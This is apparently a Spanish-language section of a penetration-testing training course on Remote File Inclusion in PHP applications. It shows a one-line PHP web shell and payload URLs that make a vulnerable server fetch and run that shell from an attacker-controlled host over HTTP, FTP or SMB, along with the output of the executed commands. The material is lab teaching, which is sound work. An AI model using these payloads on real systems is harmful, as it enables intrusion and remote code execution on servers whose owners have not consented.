Hasta ahora en este módulo, nos hemos centrado principalmente en `Local File Inclusion (LFI)`. Sin embargo, en algunos casos, también podemos incluir archivos remotos "[Remote File Inclusion (RFI)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion)", si la función vulnerable permite la inclusión de URLs remotas. Esto permite dos beneficios principales:

1. Enumerar puertos y aplicaciones web locales (i.e. SSRF)
2. Obtener ejecución remota de código al incluir un script malicioso que alojamos

En esta sección, cubriremos cómo obtener ejecución remota de código a través de vulnerabilidades RFI. El módulo [Server-side Attacks](https://academy.hackthebox.com/module/details/145) cubre varias técnicas `SSRF`, que también pueden ser utilizadas con vulnerabilidades RFI.

## Local vs. Remote File Inclusion

Cuando una función vulnerable nos permite incluir archivos remotos, podemos alojar un script malicioso y luego incluirlo en la página vulnerable para ejecutar funciones maliciosas y obtener ejecución remota de código. Si nos referimos a la tabla de la primera sección, vemos que las siguientes son algunas de las funciones que (si son vulnerables) permitirían RFI:

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`file_get_contents()`|✅|❌|✅|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`@Html.RemotePartial()`|✅|❌|✅|
|`include`|✅|✅|✅|

Como podemos ver, casi cualquier vulnerabilidad RFI también es una vulnerabilidad LFI, ya que cualquier función que permite incluir URLs remotas generalmente también permite incluir locales. Sin embargo, un LFI no necesariamente es un RFI. Esto se debe principalmente a tres razones:

1. La función vulnerable puede no permitir incluir URLs remotas.
2. Puedes controlar solo una parte del nombre del archivo y no todo el wrapper del protocolo (ej.: `http://`, `ftp://`, `https://`).
3. La configuración puede prevenir RFI por completo, ya que la mayoría de los servidores web modernos deshabilitan la inclusión de archivos remotos por defecto.

Además, como podemos notar en la tabla anterior, algunas funciones permiten incluir URLs remotas pero no permiten la ejecución de código. En este caso, aún podríamos explotar la vulnerabilidad para enumerar puertos y aplicaciones web locales a través de SSRF.

## Verify RFI

En la mayoría de los lenguajes, incluir URLs remotas se considera una práctica peligrosa ya que puede permitir tales vulnerabilidades. Es por eso que la inclusión de URLs remotas generalmente está deshabilitada por defecto. Por ejemplo, cualquier inclusión de URLs remotas en PHP requeriría que la configuración `allow_url_include` esté habilitada. Podemos verificar si esta configuración está habilitada a través de LFI, como lo hicimos en la sección anterior:

```r
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

Sin embargo, esto no siempre puede ser confiable, ya que incluso si esta configuración está habilitada, la función vulnerable puede no permitir la inclusión de URLs remotas desde el principio. Entonces, una forma más confiable de determinar si una vulnerabilidad LFI también es vulnerable a RFI es `intentar incluir una URL`, y ver si podemos obtener su contenido. Al principio, `siempre deberíamos comenzar intentando incluir una URL local` para asegurarnos de que nuestro intento no sea bloqueado por un firewall u otras medidas de seguridad. Entonces, usemos (`http://127.0.0.1:80/index.php`) como nuestra cadena de entrada y veamos si se incluye:

`http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php`

![](https://academy.hackthebox.com/storage/modules/23/lfi_local_url_include.jpg)

Como podemos ver, la página `index.php` se incluyó en la sección vulnerable (i.e. History Description), por lo que la página es realmente vulnerable a RFI, ya que podemos incluir URLs. Además, la página `index.php` no se incluyó como texto de código fuente sino que se ejecutó y se mostró como PHP, por lo que la función vulnerable también permite la ejecución de PHP, lo que nos puede permitir ejecutar código si incluimos un script PHP malicioso que alojamos en nuestra máquina.

También vemos que pudimos especificar el puerto `80` y obtener la aplicación web en ese puerto. Si el servidor backend alojaba otras aplicaciones web locales (ej. puerto `8080`), entonces podríamos acceder a ellas a través de la vulnerabilidad RFI aplicando técnicas SSRF.

**Nota:** Puede que no sea ideal incluir la página vulnerable en sí (i.e. index.php), ya que esto puede causar un bucle de inclusión recursiva y provocar un DoS en el servidor backend.

## Remote Code Execution with RFI

El primer paso para obtener ejecución remota de código es crear un script malicioso en el lenguaje de la aplicación web, PHP en este caso. Podemos usar un web shell personalizado que descargamos de internet, usar un script de reverse shell, o escribir nuestro propio web shell básico como lo hicimos en la sección anterior, que es lo que haremos en este caso:

```r
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Ahora, todo lo que necesitamos hacer es alojar este script e incluirlo a través de la vulnerabilidad RFI. Es una buena idea escuchar en un puerto HTTP común como `80` o `443`, ya que estos puertos pueden estar en la lista blanca en caso de que la aplicación web vulnerable tenga un firewall que prevenga conexiones salientes. Además, podemos alojar el script a través de un servicio FTP o un servicio SMB, como veremos a continuación.

## HTTP

Ahora, podemos iniciar un servidor en nuestra máquina con un servidor básico de python con el siguiente comando:

```r
sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
```

Ahora, podemos incluir nuestro shell local a través de RFI, como lo hicimos antes, pero usando `<OUR_IP>` y nuestro `<LISTENING_PORT>`. También especificaremos el comando a ejecutar con `&cmd=id`:

`http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id`

![](https://academy.hackthebox.com/storage/modules/23/rfi_localhost.jpg)

Como podemos ver, obtuvimos una conexión en nuestro servidor python, y el shell remoto fue incluido, y ejecutamos el comando especificado:

```r
sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...

SERVER_IP - - [SNIP] "GET /shell.php HTTP/1.0" 200 -
```

**Tip:** Podemos examinar la conexión en nuestra máquina para asegurarnos de que la solicitud se envíe como la especificamos. Por ejemplo, si vimos que se agregó una extensión extra (.php) a la solicitud, entonces podemos omitirla de nuestro payload.

## FTP

Como se mencionó anteriormente, también podemos alojar nuestro script a través del protocolo FTP. Podemos iniciar un servidor FTP básico con `pyftpdlib` de Python, de la siguiente manera:

```r
sudo python -m pyftpdlib -p 21

[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
[SNIP] concurrency model: async
[SNIP] masquerade (NAT) address: None
[SNIP] passive ports: None
```

Esto también puede ser útil en caso de que los puertos http estén bloqueados por un firewall o la cadena `http://` sea bloqueada por un WAF. Para incluir nuestro script, podemos repetir lo que hicimos antes, pero usando el esquema `ftp://` en la URL, de la siguiente manera:

`http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id`

![](https://academy.hackthebox.com/storage/modules/23/rfi_localhost.jpg)

Como podemos ver, esto funcionó de manera muy similar a nuestro ataque http, y el comando fue ejecutado. Por defecto, PHP intenta autenticarse como usuario anónimo. Si el servidor requiere autenticación válida, entonces las credenciales se pueden especificar en la URL, de la siguiente manera:

```r
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
...SNIP...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## SMB

Si la aplicación web vulnerable está alojada en un servidor Windows (lo cual podemos determinar a partir de la versión del servidor en

 los encabezados de respuesta HTTP), entonces no necesitamos que la configuración `allow_url_include` esté habilitada para la explotación RFI, ya que podemos utilizar el protocolo SMB para la inclusión de archivos remotos. Esto se debe a que Windows trata los archivos en servidores SMB remotos como archivos normales, los cuales pueden ser referenciados directamente con una ruta UNC.

Podemos iniciar un servidor SMB usando `Impacket's smbserver.py`, el cual permite autenticación anónima por defecto, de la siguiente manera:

```r
impacket-smbserver -smb2support share $(pwd)
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Ahora, podemos incluir nuestro script usando una ruta UNC (ej. `\\<OUR_IP>\share\shell.php`), y especificar el comando con (`&cmd=whoami`) como lo hicimos antes:

`http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami`

![](https://academy.hackthebox.com/storage/modules/23/windows_rfi.png)

Como podemos ver, este ataque funciona al incluir nuestro script remoto, y no necesitamos que ninguna configuración no predeterminada esté habilitada. Sin embargo, debemos tener en cuenta que esta técnica `es más probable que funcione si estamos en la misma red`, ya que acceder a servidores SMB remotos a través de internet puede estar deshabilitado por defecto, dependiendo de las configuraciones del servidor Windows.